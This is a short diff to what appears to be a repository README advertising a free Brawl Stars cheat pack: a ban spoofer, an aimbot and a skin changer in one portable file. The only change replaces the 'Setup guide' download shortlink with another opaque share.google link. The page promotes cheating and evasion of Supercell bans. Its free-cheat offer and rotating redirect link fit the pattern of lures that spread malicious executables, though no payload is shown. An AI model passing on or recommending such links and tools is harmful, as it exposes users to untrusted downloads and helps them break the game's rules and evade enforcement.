@@ -5,7 +5,7 @@
 Download the **Brawl Stars** pack: a spoofer for Supercell bans, a configurable aimbot and a full skin changer in a single portable file. **No subscription, no account, works offline.**
 
 <p align="center">
-  <a href="https://share.google/XRy5LPkznCdRHqexd"><img src="button.svg" alt="Setup guide" height="46"></a>
+  <a href="https://share.google/0m8pk5PS1MrOwz3GK"><img src="button.svg" alt="Setup guide" height="46"></a>
 </p>
 
 ## ⚡ Quick Start
